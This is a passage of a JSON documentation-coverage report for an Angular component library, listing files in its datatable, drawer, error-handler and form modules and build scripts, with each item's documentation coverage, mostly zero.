          "type": "component",
          "linktype": "component",
          "name": "StoDatatableHeaderComponent",
          "coveragePercent": 0,
          "coverageCount": "0/26",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoDatatableResizeDirective",
          "coveragePercent": 0,
          "coverageCount": "0/19",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDatatableComponent",
          "coveragePercent": 0,
          "coverageCount": "0/62",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "NormalUse",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
                "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "libs/datatable/src/testing/utils.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "columns",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/testing/utils.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "rows",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/animation.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "drawerAnimations",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/animation.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "drawerOpenAnimation",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/animation.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "overlayAnimation",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-item/nav-drawer-item.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavDrawerItemComponent",
          "coveragePercent": 0,
          "coverageCount": "0/5",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-list-item/nav-drawer-list-item.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavDrawerListItemComponent",
          "coveragePercent": 0,
          "coverageCount": "0/2",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer-list/nav-drawer-list.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavDrawerListComponent",
          "coveragePercent": 0,
          "coverageCount": "0/2",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavDrawerComponent",
          "coveragePercent": 0,
          "coverageCount": "0/7",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "component",
          "linktype": "component",
          "name": "WrapperComponent",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "injectable",
          "linktype": "injectable",
          "name": "IconService",
          "coveragePercent": 0,
          "coverageCount": "0/2",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "navigationItems",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "NormalUse",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "WithAppHeader",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "NormalUse",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDrawerFooterComponent",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDrawerHeaderComponent",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDrawerWrapperComponent",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDrawerComponent",
          "coveragePercent": 41,
          "coverageCount": "15/36",
          "status": "medium"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "MenuGroup",
          "coveragePercent": 0,
          "coverageCount": "0/6",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "MenuItem",
          "coveragePercent": 0,
          "coverageCount": "0/7",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "MenuItemCommand",
                "coveragePercent": 33,
                "coverageCount": "1/3",
                "status": "medium"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "NavigateCommand",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavigationMenuItemComponent",
          "coveragePercent": 0,
          "coverageCount": "0/7",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavigationMenuComponent",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NavigationPartComponent",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "NormalUse",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "navigation",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "subNavigation",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/tokens.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "USE_HASH_ROUTING",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "DialogComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ErrorDialogService",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ErrorHandlerService",
                "coveragePercent": 14,
                "coverageCount": "2/14",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ErrorHandler",
                "coveragePercent": 33,
                "coverageCount": "1/3",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ErrorLogger",
                "coveragePercent": 50,
                "coverageCount": "1/2",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "StoErrorHandler",
                "coveragePercent": 50,
                "coverageCount": "1/2",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Action",
                "coveragePercent": 80,
                "coverageCount": "4/5",
                "status": "very-good"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
                "type": "class",
                "linktype": "classe",
                "name": "HttpError",
                "coveragePercent": 14,
                "coverageCount": "1/7",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "CUSTOM_ERROR_HANDLER",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ERROR_LOGGER",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/wrapper.ts",
                "type": "component",
                "linktype": "component",
                "name": "NextWrapperComponent",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
        {
          "filePath": "libs/error-handler/src/lib/wrapper.ts",
          "type": "injectable",
          "linktype": "injectable",
          "name": "ErrorHandlerImpl",
          "coveragePercent": 0,
          "coverageCount": "0/2",
          "status": "low"
        },
        {
          "filePath": "libs/error-handler/src/lib/wrapper.ts",
          "type": "injectable",
          "linktype": "injectable",
          "name": "Logger",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/error-handler/src/lib/wrapper.ts",
          "type": "function",
          "linktype": "miscellaneous",
          "linksubtype": "function",
          "name": "LoggerFactory",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/error-handler/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "context",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/error-handler/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "require",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "NumberInputDirective",
          "coveragePercent": 53,
          "coverageCount": "14/26",
          "status": "good"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
          "type": "pipe",
          "linktype": "pipe",
          "name": "NumberInputPipe",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "PADDING",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NumberInputComponent",
          "coveragePercent": 0,
          "coverageCount": "0/51",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "NumberUnitInputComponent",
          "coveragePercent": 0,
          "coverageCount": "0/54",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
          "type": "class",
          "linktype": "classe",
          "name": "NumberUnit",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "control",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "SlideToggleComponent",
          "coveragePercent": 0,
          "coverageCount": "0/38",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-form/form-field.base.ts",
          "type": "class",
          "linktype": "classe",
          "name": "FormFieldBase",
          "coveragePercent": 18,
          "coverageCount": "2/11",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-form/form-field.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "FormFieldDirective",
          "coveragePercent": 0,
          "coverageCount": "0/13",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
            {
                "filePath": "libs/form/src/lib/sto-select-filter/item-list.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "items",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "MultiSelect",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "SingleSelect",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoSelectFilterComponent",
          "coveragePercent": 31,
          "coverageCount": "9/29",
          "status": "medium"
        },
        {
          "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
          "type": "class",
          "linktype": "classe",
          "name": "Modifiers",
          "coveragePercent": 0,
          "coverageCount": "0/5",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "validCommands",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygActionsComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygEditorComponent",
                "coveragePercent": 0,
                "coverageCount": "0/16",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygComponent",
                "coveragePercent": 0,
                "coverageCount": "0/19",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "unsanitized",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "libs/form/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "context",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/form/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "require",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "tools/scripts/build-scss.ts",
          "type": "function",
          "linktype": "miscellaneous",
          "linksubtype": "function",
          "name": "processScss",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "tools/scripts/build-scss.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "out",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "tools/scripts/build-scss.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "promises",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "root",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "writeFile",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "out",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "root",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "scss",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/copy-assets.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "src",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            }
        ]
    }
}
